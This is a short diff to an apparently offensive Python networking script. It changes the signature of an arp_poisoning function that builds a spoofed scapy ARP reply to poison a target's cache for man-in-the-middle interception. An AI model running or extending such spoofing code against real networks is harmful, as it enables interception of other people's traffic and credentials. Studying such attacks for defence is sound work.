@@ -6,7 +6,7 @@ import time
 import random
 from scapy_http import http
 
-def arp_poisoning(target_ip,fake_ip,interface):
+def arp_poisoning(target_ip,fake_ip):
     #op=2 just send response packet
     target_mac = get_target_mac(target_ip)
     response_pkt =  scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=fake_ip)
